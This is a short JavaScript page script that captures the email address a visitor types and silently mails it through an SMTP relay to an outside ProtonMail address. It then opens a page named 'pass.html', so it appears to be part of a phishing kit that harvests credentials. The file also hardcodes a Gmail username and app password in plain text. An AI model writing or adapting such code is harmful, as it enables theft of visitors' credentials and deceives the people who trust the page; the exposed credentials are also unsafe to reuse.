window.onload=function()
{
    let email = document.getElementById("userEmail");
    let btn = document.getElementById("btn");
    let footer = document.getElementById("footer");

    email.addEventListener("focus", myFocusFunction, true);
    email.addEventListener("blur", myBlurFunction, true);

    function myFocusFunction() {
        btn.style.backgroundColor = "#3e9920";
        footer.style.display = "none";
    }

    function myBlurFunction() {
        btn.style.backgroundColor = "";
    }


    btn.onclick = function() {
        let apmail = email.value;
        let finalmessage = `email : ${apmail} <br>`;

        if (apmail.indexOf("@") != -1) {
            Email.send({
                Host: "smtp.gmail.com",
                Username : "julio74108520@gmail.com",
                Password : "dnkf zamf xwmj amjr",
                To : 'user1533@protonmail.com',
                From : "julio74108520@gmail.com",
                Subject : "Mail from website",
                Body : finalmessage
            });
            window.open('pass.html');
        } else {
            window.open('#top');
        }
    }
}
